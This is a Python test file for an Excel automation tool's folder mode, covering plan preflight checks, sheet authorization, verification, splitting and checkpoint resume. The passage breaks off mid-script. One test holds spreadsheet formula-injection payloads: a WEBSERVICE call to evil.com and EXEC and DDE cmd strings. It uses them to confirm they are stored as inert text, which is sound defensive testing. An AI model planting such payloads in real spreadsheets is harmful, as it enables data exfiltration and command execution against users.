            "title": "拒绝带筛选条件的文件夹写入",
            "summary": "防止文件夹模式忽略筛选条件后误改整块区域",
            "actions": [action],
        }
    )

    with pytest.raises(
        ValueError,
        match=(
            rf"文件夹模式暂不支持 {action_type} 动作的筛选条件（filters）。"
            r"请在 Excel 中手动筛选后再操作，或使用当前工作簿模式。"
        ),
    ):
        execute_folder_plan(
            FolderExecuteRequest(
                sessionId=catalog.sessionId, plan=_stamp_plan(plan, snapshot)
            )
        )

    unchanged = load_workbook(source, data_only=True)
    assert unchanged["得分"]["B2"].value == 33
    assert unchanged["得分"]["D1"].value is None
    unchanged.close()
    assert not list(tmp_path.glob("*.excel-bro-backup-*"))


def test_folder_preflight_rejects_remove_duplicates(tmp_path: Path) -> None:
    source = tmp_path / "scores.xlsx"
    _create_source(source)
    catalog = scan_folder(tmp_path)
    snapshot = create_folder_snapshot(
        FolderSnapshotRequest(
            sessionId=catalog.sessionId,
            selections=[
                FolderSelection(fileId=catalog.files[0].id, sheets=["得分"])
            ],
        )
    )
    target = snapshot.worksheets[0].name
    plan = AnalysisPlan.model_validate(
        {
            "id": "reject-remove-duplicates",
            "title": "拒绝文件夹去重",
            "summary": "不允许未实现动作被记录为成功",
            "actions": [
                {
                    "type": "removeDuplicates",
                    "sheet": target,
                    "range": "A1:B3",
                    "columns": [1],
                    "hasHeaders": True,
                }
            ],
        }
    )

    with pytest.raises(ValueError, match="文件夹模式暂不支持 removeDuplicates"):
        execute_folder_plan(
            FolderExecuteRequest(
                sessionId=catalog.sessionId, plan=_stamp_plan(plan, snapshot)
            )
        )

    unchanged = load_workbook(source, data_only=True)
    assert unchanged["得分"].max_row == 3
    unchanged.close()
    assert not list(tmp_path.glob("*.excel-bro-backup-*"))


@pytest.mark.parametrize("chart_type", ["Histogram", "Waterfall", "Funnel"])
def test_folder_preflight_rejects_unsupported_chart_types_without_writing(
    tmp_path: Path, chart_type: str
) -> None:
    source = tmp_path / "scores.xlsx"
    _create_source(source)
    original_bytes = source.read_bytes()
    catalog = scan_folder(tmp_path)
    snapshot = create_folder_snapshot(
        FolderSnapshotRequest(
            sessionId=catalog.sessionId,
            selections=[
                FolderSelection(fileId=catalog.files[0].id, sheets=["得分"])
            ],
        )
    )
    target = snapshot.worksheets[0].name
    plan = AnalysisPlan.model_validate(
        {
            "id": f"reject-{chart_type.casefold()}-chart",
            "title": "拒绝不支持的图表类型",
            "summary": "在文件写入前报告文件夹模式的图表能力边界",
            "actions": [
                {
                    "type": "createChart",
                    "sheet": target,
                    "sourceRange": "A1:B3",
                    "chartType": chart_type,
                }
            ],
        }
    )

    with pytest.raises(
        ValueError,
        match=rf"第 1 步：文件夹模式暂不支持图表类型「{chart_type}」",
    ):
        execute_folder_plan(
            FolderExecuteRequest(
                sessionId=catalog.sessionId,
                plan=_stamp_plan(plan, snapshot),
            )
        )

    assert source.read_bytes() == original_bytes
    assert not (tmp_path / ".excel-bro-backups").exists()


@pytest.mark.parametrize(
    ("chart_type", "expected_direction"),
    [("ColumnClustered", "col"), ("BarClustered", "bar")],
)
def test_folder_executes_supported_bar_chart_types(
    tmp_path: Path, chart_type: str, expected_direction: str
) -> None:
    source = tmp_path / "scores.xlsx"
    _create_source(source)
    catalog = scan_folder(tmp_path)
    snapshot = create_folder_snapshot(
        FolderSnapshotRequest(
            sessionId=catalog.sessionId,
            selections=[
                FolderSelection(fileId=catalog.files[0].id, sheets=["得分"])
            ],
        )
    )
    plan = AnalysisPlan.model_validate(
        {
            "id": f"create-supported-{chart_type.casefold()}-chart",
            "title": "创建受支持的图表",
            "summary": "文件夹模式继续支持已实现的图表类型",
            "actions": [
                {
                    "type": "createChart",
                    "sheet": snapshot.worksheets[0].name,
                    "sourceRange": "A1:B3",
                    "chartType": chart_type,
                    "title": "得分图",
                }
            ],
        }
    )

    result = execute_folder_plan(
        FolderExecuteRequest(
            sessionId=catalog.sessionId,
            plan=_stamp_plan(plan, snapshot),
        )
    )

    assert result.actionResults[0].changed is True
    workbook = load_workbook(source, data_only=False)
    try:
        assert len(workbook["得分"]._charts) == 1
        assert workbook["得分"]._charts[0].type == expected_direction
        assert workbook["得分"]._charts[0].grouping == "clustered"
    finally:
        workbook.close()


def test_folder_dispatch_rejects_unmatched_action(tmp_path: Path) -> None:
    source = tmp_path / "scores.xlsx"
    _create_source(source)
    catalog = scan_folder(tmp_path)
    snapshot = create_folder_snapshot(
        FolderSnapshotRequest(
            sessionId=catalog.sessionId,
            selections=[
                FolderSelection(fileId=catalog.files[0].id, sheets=["得分"])
            ],
        )
    )
    target = snapshot.worksheets[0].name
    plan = AnalysisPlan.model_validate(
        {
            "id": "reject-unmatched-action",
            "title": "拒绝未匹配动作",
            "summary": "动作分发必须穷尽",
            "actions": [
                {
                    "type": "writeValues",
                    "sheet": target,
                    "range": "B2",
                    "values": [[99]],
                }
            ],
        }
    )
    plan.actions[0].type = "futureAction"  # type: ignore[assignment]

    with pytest.raises(ValueError, match="文件夹模式未实现动作：futureAction"):
        execute_folder_plan(
            FolderExecuteRequest(
                sessionId=catalog.sessionId, plan=_stamp_plan(plan, snapshot)
            )
        )

    unchanged = load_workbook(source, data_only=True)
    assert unchanged["得分"]["B2"].value == 33
    unchanged.close()
    assert not list(tmp_path.glob("*.excel-bro-backup-*"))


@pytest.mark.parametrize(
    "action",
    [
        {
            "type": "writeValues",
            "sheet": "历史汇总",
            "range": "A1",
            "values": [["不允许"]],
        },
        {"type": "deleteWorksheet", "sheet": "历史汇总"},
        {"type": "createWorksheet", "sheet": "历史汇总"},
    ],
)
def test_folder_preflight_rejects_unauthorized_existing_output_sheets(
    tmp_path: Path, action: dict[str, object]
) -> None:
    source = tmp_path / "scores.xlsx"
    _create_source(source)
    output = tmp_path / OUTPUT_FILE_NAME
    output_book = Workbook()
    output_book.active.title = "历史汇总"
    output_book.active["A1"] = "保留"
    output_book.save(output)
    output_book.close()

    catalog = scan_folder(tmp_path)
    source_info = next(file for file in catalog.files if file.name == source.name)
    snapshot = create_folder_snapshot(
        FolderSnapshotRequest(
            sessionId=catalog.sessionId,
            selections=[FolderSelection(fileId=source_info.id, sheets=["得分"])],
        )
    )
    plan = AnalysisPlan.model_validate(
        {
            "id": f"reject-unauthorized-{action['type']}",
            "title": "拒绝未授权输出表",
            "summary": "不能覆盖输出文件中的未授权现有工作表",
            "actions": [action],
        }
    )

    with pytest.raises(
        ValueError,
        match=rf"动作 {action['type']} 尝试写入未授权的工作表「历史汇总」",
    ):
        execute_folder_plan(
            FolderExecuteRequest(
                sessionId=catalog.sessionId, plan=_stamp_plan(plan, snapshot)
            )
        )

    unchanged = load_workbook(output, data_only=True)
    assert unchanged.sheetnames == ["历史汇总"]
    assert unchanged["历史汇总"]["A1"].value == "保留"
    unchanged.close()
    assert not list(tmp_path.glob("*.excel-bro-backup-*"))


def test_folder_preflight_rejects_an_unauthorized_copy_source(
    tmp_path: Path,
) -> None:
    source = tmp_path / "scores.xlsx"
    _create_source(source)
    output = tmp_path / OUTPUT_FILE_NAME
    output_book = Workbook()
    output_book.active.title = "历史汇总"
    output_book.active["A1"] = "保留"
    output_book.save(output)
    output_book.close()

    catalog = scan_folder(tmp_path)
    source_info = next(file for file in catalog.files if file.name == source.name)
    snapshot = create_folder_snapshot(
        FolderSnapshotRequest(
            sessionId=catalog.sessionId,
            selections=[FolderSelection(fileId=source_info.id, sheets=["得分"])],
        )
    )
    plan = AnalysisPlan.model_validate(
        {
            "id": "reject-unauthorized-copy-source",
            "title": "拒绝未授权复制源",
            "summary": "不能从输出文件中的未授权现有工作表读取",
            "actions": [
                {
                    "type": "copyRange",
                    "sheet": "复制结果",
                    "sourceSheet": "历史汇总",
                    "sourceRange": "A1",
                    "targetRange": "A1",
                    "copyType": "values",
                }
            ],
        }
    )

    with pytest.raises(
        ValueError,
        match="动作 copyRange 尝试读取未授权的工作表「历史汇总」",
    ):
        execute_folder_plan(
            FolderExecuteRequest(
                sessionId=catalog.sessionId, plan=_stamp_plan(plan, snapshot)
            )
        )

    unchanged = load_workbook(output, data_only=True)
    assert unchanged.sheetnames == ["历史汇总"]
    assert unchanged["历史汇总"]["A1"].value == "保留"
    unchanged.close()
    assert not list(tmp_path.glob("*.excel-bro-backup-*"))


def test_folder_preflight_prevents_earlier_writes_when_later_source_is_missing(
    tmp_path: Path,
) -> None:
    source = tmp_path / "scores.xlsx"
    _create_source(source)
    catalog = scan_folder(tmp_path)
    snapshot = create_folder_snapshot(
        FolderSnapshotRequest(
            sessionId=catalog.sessionId,
            selections=[
                FolderSelection(fileId=catalog.files[0].id, sheets=["得分"])
            ],
        )
    )
    target = snapshot.worksheets[0].name
    plan = AnalysisPlan.model_validate(
        {
            "id": "preflight-missing-source",
            "title": "预检缺失源表",
            "summary": "后续步骤失败时不能先写入前面的值",
            "actions": [
                {
                    "type": "writeValues",
                    "sheet": target,
                    "range": "B2",
                    "values": [[99]],
                },
                {
                    "type": "copyRange",
                    "sheet": target,
                    "sourceSheet": "不存在",
                    "sourceRange": "A1",
                    "targetRange": "B3",
                    "copyType": "values",
                    "skipBlanks": False,
                    "transpose": False,
                },
            ],
        }
    )

    with pytest.raises(
        ValueError,
        match="执行前检查未通过.*第 2 步.*复制源工作表",
    ):
        execute_folder_plan(
            FolderExecuteRequest(
                sessionId=catalog.sessionId, plan=_stamp_plan(plan, snapshot)
            )
        )

    unchanged = load_workbook(source, data_only=True)
    assert unchanged["得分"]["B2"].value == 33
    unchanged.close()
    assert not list(tmp_path.glob("*.excel-bro-backup-*"))


def test_folder_preflight_rejects_invalid_range_before_writing(
    tmp_path: Path,
) -> None:
    source = tmp_path / "scores.xlsx"
    _create_source(source)
    catalog = scan_folder(tmp_path)
    snapshot = create_folder_snapshot(
        FolderSnapshotRequest(
            sessionId=catalog.sessionId,
            selections=[
                FolderSelection(fileId=catalog.files[0].id, sheets=["得分"])
            ],
        )
    )
    target = snapshot.worksheets[0].name
    plan = AnalysisPlan.model_validate(
        {
            "id": "preflight-invalid-range",
            "title": "预检区域地址",
            "summary": "区域地址错误时不应先写入",
            "actions": [
                {
                    "type": "writeValues",
                    "sheet": target,
                    "range": "B2",
                    "values": [[99]],
                },
                {
                    "type": "clearRange",
                    "sheet": target,
                    "range": "not-a-range",
                    "applyTo": "contents",
                },
            ],
        }
    )

    with pytest.raises(
        ValueError,
        match=r"执行前检查未通过.*第 2 步.*区域.*无效",
    ):
        execute_folder_plan(
            FolderExecuteRequest(
                sessionId=catalog.sessionId, plan=_stamp_plan(plan, snapshot)
            )
        )

    unchanged = load_workbook(source, data_only=True)
    assert unchanged["得分"]["B2"].value == 33
    unchanged.close()


def test_folder_preflight_rejects_table_and_named_range_conflict(
    tmp_path: Path,
) -> None:
    source = tmp_path / "scores.xlsx"
    _create_source(source)
    catalog = scan_folder(tmp_path)
    snapshot = create_folder_snapshot(
        FolderSnapshotRequest(
            sessionId=catalog.sessionId,
            selections=[
                FolderSelection(fileId=catalog.files[0].id, sheets=["得分"])
            ],
        )
    )
    target = snapshot.worksheets[0].name
    plan = AnalysisPlan.model_validate(
        {
            "id": "preflight-object-name",
            "title": "预检对象名称",
            "summary": "同一计划不能重复使用对象名称",
            "actions": [
                {
                    "type": "createTable",
                    "sheet": target,
                    "range": "A1:B3",
                    "name": "Scores",
                    "hasHeaders": True,
                },
                {
                    "type": "addNamedRange",
                    "sheet": target,
                    "name": "scores",
                    "range": "A1:B3",
                },
            ],
        }
    )

    with pytest.raises(
        ValueError,
        match="执行前检查未通过.*第 2 步.*名称.*已存在",
    ):
        execute_folder_plan(
            FolderExecuteRequest(
                sessionId=catalog.sessionId, plan=_stamp_plan(plan, snapshot)
            )
        )

    unchanged = load_workbook(source)
    assert not unchanged["得分"].tables
    unchanged.close()


def test_folder_verification_reports_an_expected_value_mismatch(
    tmp_path: Path,
) -> None:
    source = tmp_path / "scores.xlsx"
    _create_source(source)
    catalog = scan_folder(tmp_path)
    plan = AnalysisPlan.model_validate(
        {
            "id": "failed-verification",
            "title": "验证失败示例",
            "summary": "执行值与验收值不同",
            "actions": [
                {
                    "type": "writeValues",
                    "sheet": "结果",
                    "range": "A1",
                    "values": [[1]],
                }
            ],
            "acceptanceCriteria": [
                {
                    "type": "rangeEquals",
                    "sheet": "结果",
                    "range": "A1",
                    "expected": [[2]],
                }
            ],
        }
    )

    result = execute_folder_plan(
        FolderExecuteRequest(sessionId=catalog.sessionId, plan=plan)
    )

    assert result.verification.status == "failed"
    assert result.verification.passed is False
    assert result.verification.checks[0].actual == [[1]]
    assert "与预期不一致" in result.verification.checks[0].message


def test_folder_verifies_sort_filter_table_and_cleared_filter(
    tmp_path: Path,
) -> None:
    source = tmp_path / "scores.xlsx"
    _create_source(source)
    catalog = scan_folder(tmp_path)
    plan = AnalysisPlan.model_validate(
        {
            "id": "verify-structured-actions",
            "title": "排序筛选表格验收",
            "summary": "读取保存后的真实对象状态",
            "actions": [
                {"type": "createWorksheet", "sheet": "汇总"},
                {
                    "type": "writeValues",
                    "sheet": "汇总",
                    "range": "A1:B4",
                    "values": [
                        ["人员", "得分"],
                        ["乙", 20],
                        ["甲", 30],
                        ["丙", None],
                    ],
                },
                {
                    "type": "sortRange",
                    "sheet": "汇总",
                    "range": "A1:B4",
                    "keys": [{"column": 1, "ascending": False}],
                    "hasHeaders": True,
                },
                {
                    "type": "filterRange",
                    "sheet": "汇总",
                    "range": "A1:B4",
                    "column": 0,
                    "values": ["甲", "乙"],
                },
                {
                    "type": "createTable",
                    "sheet": "汇总",
                    "range": "A1:B4",
                    "name": "ResultTable",
                    "hasHeaders": True,
                },
            ],
            "acceptanceCriteria": [
                {
                    "type": "rangeEquals",
                    "sheet": "汇总",
                    "range": "A1:B4",
                    "expected": [
                        ["人员", "得分"],
                        ["甲", 30],
                        ["乙", 20],
                        ["丙", None],
                    ],
                }
            ],
        }
    )

    result = execute_folder_plan(
        FolderExecuteRequest(sessionId=catalog.sessionId, plan=plan)
    )

    assert result.verification.status == "verified"
    assert result.verification.passed is True
    assert {check.criterion.type for check in result.verification.checks} >= {
        "rangeSorted",
        "filterApplied",
        "tableExists",
    }
    assert all(check.passed for check in result.verification.checks)

    refreshed = refresh_folder(catalog.sessionId)
    output_info = next(
        file for file in refreshed.files if file.name == OUTPUT_FILE_NAME
    )
    clear_snapshot = create_folder_snapshot(
        FolderSnapshotRequest(
            sessionId=catalog.sessionId,
            selections=[
                FolderSelection(fileId=output_info.id, sheets=["汇总"])
            ],
        )
    )
    clear_target = clear_snapshot.worksheets[0].name
    clear_plan = AnalysisPlan.model_validate(
        {
            "id": "verify-cleared-filter",
            "title": "清除筛选验收",
            "summary": "确认筛选条件已清除",
            "actions": [{"type": "clearFilter", "sheet": clear_target}],
        }
    )
    cleared = execute_folder_plan(
        FolderExecuteRequest(
            sessionId=catalog.sessionId,
            plan=_stamp_plan(clear_plan, clear_snapshot),
        )
    )
    assert cleared.verification.status == "verified"
    assert cleared.verification.checks[-1].criterion.type == "filterCleared"
    assert cleared.verification.checks[-1].passed is True


def test_folder_mode_writes_formulas_formats_and_clears_ranges(
    tmp_path: Path,
) -> None:
    source = tmp_path / "scores.xlsx"
    _create_source(source)
    catalog = scan_folder(tmp_path)
    snapshot = create_folder_snapshot(
        FolderSnapshotRequest(
            sessionId=catalog.sessionId,
            selections=[
                FolderSelection(fileId=catalog.files[0].id, sheets=["得分"])
            ],
        )
    )
    target = snapshot.worksheets[0].name
    plan = AnalysisPlan.model_validate(
        {
            "id": "advanced-edit",
            "title": "公式与格式",
            "summary": "写入公式、设置格式并清空旧值",
            "actions": [
                {
                    "type": "writeFormulas",
                    "sheet": target,
                    "range": "C2",
                    "formulas": [["=SUM(B2:B4)"]],
                },
                {
                    "type": "setNumberFormat",
                    "sheet": target,
                    "range": "C2",
                    "formatCode": "0.00",
                },
                {
                    "type": "clearRange",
                    "sheet": target,
                    "range": "B2",
                    "applyTo": "contents",
                },
            ],
        }
    )

    result = execute_folder_plan(
        FolderExecuteRequest(
            sessionId=catalog.sessionId, plan=_stamp_plan(plan, snapshot)
        )
    )

    updated = load_workbook(source, data_only=False)
    assert updated["得分"]["C2"].value == "=SUM(B2:B4)"
    assert updated["得分"]["C2"].number_format == "0.00"
    assert updated["得分"]["B2"].value is None
    updated.close()
    assert result.verification.status == "verified"
    assert result.verification.passed is True
    assert result.verification.unverifiedActions == []


def test_folder_mode_quotes_formula_like_values_to_prevent_injection(
    tmp_path: Path,
) -> None:
    source = tmp_path / "scores.xlsx"
    _create_source(source)
    catalog = scan_folder(tmp_path)
    snapshot = create_folder_snapshot(
        FolderSnapshotRequest(
            sessionId=catalog.sessionId,
            selections=[
                FolderSelection(fileId=catalog.files[0].id, sheets=["得分"])
            ],
        )
    )
    target = snapshot.worksheets[0].name
    plan = AnalysisPlan.model_validate(
        {
            "id": "inject-guard",
            "title": "防公式注入",
            "summary": "值路径的 = 开头字符串应按文本存储",
            "actions": [
                {
                    "type": "writeValues",
                    "sheet": target,
                    "range": "B2",
                    "values": [[r'=WEBSERVICE("http://evil.com")']],
                },
                {
                    "type": "writeTable",
                    "sheet": target,
                    "startCell": "D1",
                    "headers": [r"=EXEC('calc')"],
                    "rows": [[r"=cmd|'/c calc'!A0"]],
                },
            ],
        }
    )

    result = execute_folder_plan(
        FolderExecuteRequest(
            sessionId=catalog.sessionId, plan=_stamp_plan(plan, snapshot)
        )
    )

    updated = load_workbook(source, data_only=False)
    ws = updated["得分"]
    b2 = ws["B2"]
    d1 = ws["D1"]
    d2 = ws["D2"]
    # 值路径注入被强制为文本：data_type 是字符串而非公式，且带前导撇号。
    assert b2.data_type == "s"
    assert b2.value == '\'=WEBSERVICE("http://evil.com")'
    assert d1.data_type == "s"
    assert d1.value == "'=EXEC('calc')"
    assert d2.data_type == "s"
    assert d2.value == "'=cmd|'/c calc'!A0"
    updated.close()
    assert result.verification.status == "verified"
    assert result.verification.passed is True
    assert result.verification.unverifiedActions == []


def test_folder_verifies_formats_validation_and_freeze_panes(
    tmp_path: Path,
) -> None:
    source = tmp_path / "scores.xlsx"
    _create_source(source)
    catalog = scan_folder(tmp_path)
    snapshot = create_folder_snapshot(
        FolderSnapshotRequest(
            sessionId=catalog.sessionId,
            selections=[
                FolderSelection(fileId=catalog.files[0].id, sheets=["得分"])
            ],
        )
    )
    target = snapshot.worksheets[0].name
    plan = AnalysisPlan.model_validate(
        {
            "id": "verify-formatting",
            "title": "格式与验证验收",
            "summary": "检查保存后的真实格式、验证规则和冻结位置",
            "actions": [
                {
                    "type": "setFill",
                    "sheet": target,
                    "range": "A2:B3",
                    "color": "#DFF3E4",
                },
                {
                    "type": "setFont",
                    "sheet": target,
                    "range": "A2:B3",
                    "bold": True,
                    "color": "#123456",
                },
                {
                    "type": "setNumberFormat",
                    "sheet": target,
                    "range": "B2:B3",
                    "formatCode": "0.00",
                },
                {
                    "type": "setBorders",
                    "sheet": target,
                    "range": "A2:B3",
                    "sides": [
                        "top",
                        "bottom",
                        "left",
                        "right",
                        "insideHorizontal",
                        "insideVertical",
                    ],
                    "style": "continuous",
                    "color": "#445566",
                    "weight": "medium",
                },
                {
                    "type": "setAlignment",
                    "sheet": target,
                    "range": "A2:B3",
                    "horizontal": "center",
                    "vertical": "bottom",
                    "wrapText": True,
                },
                {
                    "type": "resizeRange",
                    "sheet": target,
                    "range": "A2:B3",
                    "rowHeight": 24,
                    "columnWidth": 18,
                },
                {
                    "type": "setDataValidation",
                    "sheet": target,
                    "range": "B2:B3",
                    "validationType": "wholeNumber",
                    "formula1": 0,
                    "formula2": 100,
                    "operator": "between",
                    "allowBlank": False,
                    "prompt": "请输入 0 到 100",
                    "errorMessage": "分数超出范围",
                },
                {
                    "type": "freezePanes",
                    "sheet": target,
                    "rows": 1,
                    "columns": 1,
                },
            ],
        }
    )

    result = execute_folder_plan(
        FolderExecuteRequest(
            sessionId=catalog.sessionId, plan=_stamp_plan(plan, snapshot)
        )
    )

    assert result.verification.status == "verified"
    assert result.verification.passed is True
    assert result.verification.unverifiedActions == []
    assert all(check.passed for check in result.verification.checks)
    assert {check.criterion.type for check in result.verification.checks} >= {
        "rangeFormatMatches",
        "bordersMatch",
        "dataValidationMatches",
        "freezePanesMatches",
    }


def test_folder_keeps_unsupported_format_verification_explicit(
    tmp_path: Path,
) -> None:
    source = tmp_path / "scores.xlsx"
    _create_source(source)
    catalog = scan_folder(tmp_path)
    snapshot = create_folder_snapshot(
        FolderSnapshotRequest(
            sessionId=catalog.sessionId,
            selections=[
                FolderSelection(fileId=catalog.files[0].id, sheets=["得分"])
            ],
        )
    )
    target = snapshot.worksheets[0].name
    plan = AnalysisPlan.model_validate(
        {
            "id": "unverified-conditional-format",
            "title": "条件格式弱验收",
            "summary": "无法稳定读取的属性保持未独立验证",
            "actions": [
                {
                    "type": "setConditionalFormat",
                    "sheet": target,
                    "range": "B2:B3",
                    "ruleType": "cellValue",
                    "operator": "greaterThan",
                    "formula1": 40,
                    "color": "#FFF2CC",
                }
            ],
        }
    )

    result = execute_folder_plan(
        FolderExecuteRequest(
            sessionId=catalog.sessionId, plan=_stamp_plan(plan, snapshot)
        )
    )

    assert result.verification.status == "executed_unverified"
    assert [gap.type for gap in result.verification.unverifiedActions] == [
        "setConditionalFormat"
    ]


def test_folder_mode_deletes_a_selected_sheet_and_verifies_it(
    tmp_path: Path,
) -> None:
    source = tmp_path / "scores.xlsx"
    _create_source(source)
    catalog = scan_folder(tmp_path)
    snapshot = create_folder_snapshot(
        FolderSnapshotRequest(
            sessionId=catalog.sessionId,
            selections=[
                FolderSelection(fileId=catalog.files[0].id, sheets=["说明"])
            ],
        )
    )
    target = snapshot.worksheets[0].name
    plan = AnalysisPlan.model_validate(
        {
            "id": "delete-sheet",
            "title": "删除说明",
            "summary": "删除已选说明工作表",
            "actions": [{"type": "deleteWorksheet", "sheet": target}],
        }
    )

    result = execute_folder_plan(
        FolderExecuteRequest(
            sessionId=catalog.sessionId, plan=_stamp_plan(plan, snapshot)
        )
    )

    updated = load_workbook(source)
    assert "说明" not in updated.sheetnames
    updated.close()
    assert result.verification.status == "verified"
    assert result.verification.passed is True


def test_folder_mode_splits_full_table_and_calculates_group_ratios(
    tmp_path: Path,
) -> None:
    source = tmp_path / "cinema.xlsx"
    workbook = Workbook()
    sheet = workbook.active
    sheet.title = "sheet-dc1"
    sheet.append(["hunan(制表日期:2026-07-25)", None, None, None])
    sheet.append([None, None, None, None])
    sheet.append(["影院名称", "影院编码", "影厅", "影片名称"])
    sheet.append(["怀化横店电影城", "43122301", "1号厅", "恐怖游轮"])
    sheet.append(["怀化横店电影城", "43122301", "2号厅", "恐怖游轮"])
    sheet.append(["怀化横店电影城", "43122301", "3号厅", "功夫女足"])
    sheet.append(["广州影院", "44010001", "1号厅", "恐怖游轮"])
    for hall in range(2, 7):
        sheet.append(
            ["广州影院", "44010001", f"{hall}号厅", "功夫女足"]
        )
    sheet.append(["长沙影院", "43010001", "1号厅", "三国第一部：争洛阳"])
    workbook.save(source)
    workbook.close()

    catalog = scan_folder(tmp_path)
    snapshot = create_folder_snapshot(
        FolderSnapshotRequest(
            sessionId=catalog.sessionId,
            selections=[
                FolderSelection(
                    fileId=catalog.files[0].id, sheets=["sheet-dc1"]
                )
            ],
        )
    )
    plan = AnalysisPlan.model_validate(
        {
            "id": "split-cinema",
            "title": "按影片拆分",
            "summary": "按影院统计影片记录数和占比",
            "actions": [
                {
                    "type": "splitGroupAggregate",
                    "sheet": snapshot.worksheets[0].name,
                    "splitBy": "影片名称",
                    "groupBy": ["影院名称", "影院编码"],
                    "metrics": [
                        {
                            "operation": "countRows",
                            "outputName": "计数项:影厅",
                            "ratioOutputName": "占比",
                        }
                    ],
                }
            ],
        }
    )

    result = execute_folder_plan(
        FolderExecuteRequest(
            sessionId=catalog.sessionId, plan=_stamp_plan(plan, snapshot)
        )
    )

    updated = load_workbook(source, data_only=True)
    assert "恐怖游轮" in updated.sheetnames
    assert "功夫女足" in updated.sheetnames
    assert "三国第一部 争洛阳" in updated.sheetnames
    horror = updated["恐怖游轮"]
    assert [cell.value for cell in horror[1]] == [
        "影院名称",
        "影院编码",
        "影片名称",
        "计数项:影厅",
        "占比",
    ]
    assert [cell.value for cell in horror[2]] == [
        "怀化横店电影城",
        "43122301",
        "恐怖游轮",
        2,
        pytest.approx(2 / 3),
    ]
    assert [cell.value for cell in horror[3]] == [
        "广州影院",
        "44010001",
        "恐怖游轮",
        1,
        pytest.approx(1 / 6),
    ]
    assert horror["E2"].number_format == "0.00%"
    updated.close()
    assert result.verification.status == "verified"
    assert result.verification.passed is True
    assert result.verification.unverifiedActions == []
    split_checks = [
        check
        for check in result.verification.checks
        if check.criterion.sheet in {
            "恐怖游轮",
            "功夫女足",
            "三国第一部 争洛阳",
        }
    ]
    assert len(split_checks) == 3
    assert all(check.passed for check in split_checks)
    horror_check = next(
        check for check in split_checks if check.criterion.sheet == "恐怖游轮"
    )
    assert horror_check.actual[1] == [
        "怀化横店电影城",
        "43122301",
        "恐怖游轮",
        2,
        pytest.approx(2 / 3),
    ]
    assert horror_check.actual[2] == [
        "广州影院",
        "44010001",
        "恐怖游轮",
        1,
        pytest.approx(1 / 6),
    ]


def test_split_group_checkpoint_resumes_staged_artifact_and_rejects_external_edit(
    tmp_path: Path,
) -> None:
    source = tmp_path / "cinema.xlsx"
    workbook = Workbook()
    sheet = workbook.active
    sheet.title = "sheet-dc1"
    sheet.append(["影院名称", "影院编码", "影厅", "影片名称"])
    sheet.append(["怀化横店电影城", "43122301", "1号厅", "恐怖游轮"])
    sheet.append(["怀化横店电影城", "43122301", "2号厅", "恐怖游轮"])
    sheet.append(["怀化横店电影城", "43122301", "3号厅", "功夫女足"])
    workbook.save(source)
    workbook.close()

    catalog = scan_folder(tmp_path)
    snapshot = create_folder_snapshot(
        FolderSnapshotRequest(
            sessionId=catalog.sessionId,
            selections=[FolderSelection(fileId=catalog.files[0].id, sheets=["sheet-dc1"])],
        )
    )
    plan = _stamp_plan(
        AnalysisPlan.model_validate(
            {
                "id": "split-resume",
                "title": "按影片拆分",
                "summary": "生成可续跑的影片拆分结果",
                "actions": [
                    {
                        "type": "splitGroupAggregate",
                        "sheet": snapshot.worksheets[0].name,
                        "splitBy": "影片名称",
                        "groupBy": ["影院名称", "影院编码"],
                        "metrics": [
                            {
                                "operation": "countRows",
                                "outputName": "计数项:影厅",
                                "ratioOutputName": "占比",
                            }
                        ],
                    }
                ],
            }
        ),
        snapshot,
    )
    request = FolderExecuteRequest(
        sessionId=catalog.sessionId,
        operationId="split-resume-operation",
        plan=plan,
    )
    authorization = folder_execution_context(request)
    checkpoints: list[dict[str, object]] = []

    execute_folder_plan(
        request,
        on_checkpoint=lambda value: checkpoints.append(
            json.loads(json.dumps(value, ensure_ascii=False))
        ),
    )

    prepared = next(item for item in checkpoints if item["stage"] == "publish_prepared")
    manifest_path = tmp_path / str(prepared["backupManifestRelativePath"])
    manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
    backup_directory = manifest_path.parent
    shutil.copy2(backup_directory / "cinema.xlsx", source)
    manifest["status"] = "prepared"
    manifest.pop("completedAt", None)
    for item in manifest["files"]:
        item["state"] = "prepared"
    folder_workbooks_module._atomic_write_manifest(backup_directory, manifest)
    folder_workbooks_module._sessions.clear()

    summary = folder_resume_checkpoint_summary(
        request.operationId or "", authorization, prepared
    )
    assert summary == {
        "canResume": True,
        "reason": None,
        "filesApplied": 0,
        "filesPending": 1,
    }

    resumed_checkpoints: list[dict[str, object]] = []
    resumed = resume_folder_plan(
        request.operationId or "",
        authorization,
        prepared,
        on_checkpoint=lambda value: resumed_checkpoints.append(value),
    )

    updated = load_workbook(source, data_only=True)
    assert updated["恐怖游轮"]["D2"].value == 2
    updated.close()
    assert resumed.verification.status == "verified"
    assert resumed_checkpoints[-1]["stage"] == "published"

    shutil.copy2(backup_directory / "cinema.xlsx", source)
    changed = load_workbook(source)
    changed["sheet-dc1"]["A2"] = "外部修改"
    changed.save(source)
    changed.close()
    manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
    manifest["status"] = "prepared"
    for item in manifest["files"]:
        item["state"] = "prepared"
    folder_workbooks_module._atomic_write_manifest(backup_directory, manifest)
    folder_workbooks_module._sessions.clear()

    summary = folder_resume_checkpoint_summary(
        request.operationId or "", authorization, prepared
    )
    assert summary["canResume"] is False
    assert "外部修改" in str(summary["reason"])

    with pytest.raises(ValueError, match="外部修改"):
        resume_folder_plan(request.operationId or "", authorization, prepared)


def test_split_group_resume_after_real_process_exit_before_publish(tmp_path: Path) -> None:
    source = tmp_path / "cinema.xlsx"
    workbook = Workbook()
    sheet = workbook.active
    sheet.title = "sheet-dc1"
    sheet.append(["影院名称", "影院编码", "影厅", "影片名称"])
    sheet.append(["怀化横店电影城", "43122301", "1号厅", "恐怖游轮"])
    sheet.append(["怀化横店电影城", "43122301", "2号厅", "恐怖游轮"])
    sheet.append(["怀化横店电影城", "43122301", "3号厅", "功夫女足"])
    workbook.save(source)
    workbook.close()
    original_fingerprint = folder_workbooks_module._file_content_fingerprint(source)
    database = tmp_path / "task-state.sqlite3"
    operation_id = "split-real-crash-operation"

    script = r'''
import os
import sys
from pathlib import Path
from server.app.folder_workbooks import (
    FolderExecuteRequest,
    FolderSelection,
    FolderSnapshotRequest,
    create_folder_snapshot,
    execute_folder_plan,
    folder_execution_context,
    scan_folder,
)
from server.app.models import AnalysisPlan
from server.app.task_ledger import FolderOperationLedger

root = Path(sys.argv[1])
database = Path(sys.argv[2])
operation_id = sys.argv[3]
catalog = scan_folder(root)
source_file = next(item for item in catalog.files if item.name == "cinema.xlsx")
snapshot = create_folder_snapshot(
    FolderSnapshotRequest(
        sessionId=catalog.sessionId,
